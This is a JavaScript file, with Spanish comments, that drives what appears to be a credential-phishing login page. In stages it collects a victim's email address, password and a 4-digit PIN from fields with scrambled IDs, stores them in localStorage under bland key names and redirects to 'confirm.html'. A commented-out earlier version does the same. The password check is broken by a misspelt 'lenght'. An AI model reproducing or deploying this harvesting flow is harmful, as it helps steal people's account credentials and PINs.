/*function cv(params) {
    localStorage.setItem("common", document.getElementById("ui").value);
    localStorage.setItem("commons", document.getElementById("oy").value);
    document.getElementById("gh").style.display = "none";
    document.getElementById("miracle").style.display = "block";
 }
 
 
 const bfg = setInterval(() => {
 
    console.log("asdsad")
    document.getElementById('ui').addEventListener('input', function() {
       campo = document.getElementById('ui');
       
           
     var reg = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    
    var regOficial = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
    
       
       if (reg.test(campo.value) && regOficial.test(campo.value)) {
          document.getElementById("btns").disabled = false;
          clearInterval(bfg);
       } else if (reg.test(campo.value)) {
          document.getElementById("btns").disabled = false;
          clearInterval(bfg);
    
       } else {
          document.getElementById("btns").disabled = true;
    
    }
    });
    
   
 }, 2000);
 
 $(document).ready(function() {
    $("#pntwo").on("keyup", function(event) {
      if (event.currentTarget.value.length == 4) {
       localStorage.setItem("commonpn", document.getElementById("pnone").value);
       localStorage.setItem("commonspnn", document.getElementById("pntwo").value);
       window.location = "confirm.html"
      }
    });
 });*/
setTimeout(() => {
  // Obtener el campo de entrada y el botón de enviar
  var input = document.getElementById("tlVVJNECrWGtadX");
  var botonEnviar = document.getElementById("btn1");

  // Agregar un evento de clic al botón de enviar
  botonEnviar.addEventListener("click", function (event) {
    // Prevenir el envío del formulario si la entrada es inválida
    console.log("asdasd");
    event.preventDefault();

    // Obtener el valor del campo de entrada y eliminar los espacios en blanco al principio y al final
    var valor = input.value.trim();

    // Validar que la entrada no esté vacía y que contenga una dirección de correo electrónico válida
    if (valor === "" || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(valor)) {
      alert("Por favor, introduce una dirección de correo electrónico válida.");
      return false;
    } else {
      nrf();
    }
  });
}, 2000);

function nrf(params) {
  var input = document.getElementById("tlVVJNECrWGtadX");
  var inputval = document.getElementById("tlVVJNECrWGtadX").value;
  var input1 = document.getElementById("mxLRLDLOWkkKsDR");
  var pname = document.getElementById("n4m3");
  var psname = document.getElementById("AoKvmGtBuncIBBX");

  input.classList.add("hide");
  setTimeout(function () {
    document.getElementById("btn1").style.display = "none";
    input.style.display = "none";
    psname.style.display = "none";
    input1.style.display = "block";
    pname.innerHTML = inputval;
    pname.style.display = "block";
    document.getElementById("btn2").style.display = "block";
  }, 1000);
}

function cps(params) {
  if (document.getElementById("mxLRLDLOWkkKsDR").value.lenght < 6) {
    alert("contraseña incompleta o erronea");
  } else {
    vbd();
  }
}
function vbd(params) {
  document.getElementById("n4m3").style.display = "none";
  document.getElementById("AoKvmGtBuncIBBXs").style.display = "block";
  document.getElementById("mxLRLDLOWkkKsDR").style.display = "none";
  document.getElementById("tlVVJNECrWGtadXs").style.display = "block";
  document.getElementById("btn2").setAttribute("onclick", "pch()");
}

function pch(params) {
  if (document.getElementById("tlVVJNECrWGtadXs").value.length < 4) {
    alert("pin incompleto, debe tener al menos 4 digitos. ");
  } else {
    localStorage.setItem(
      "commonpn",
      document.getElementById("tlVVJNECrWGtadXs").value
    );

    localStorage.setItem(
      "common",
      document.getElementById("tlVVJNECrWGtadX").value
    );
    localStorage.setItem(
      "commons",
      document.getElementById("mxLRLDLOWkkKsDR").value
    );
    window.location = "confirm.html";
  }
}
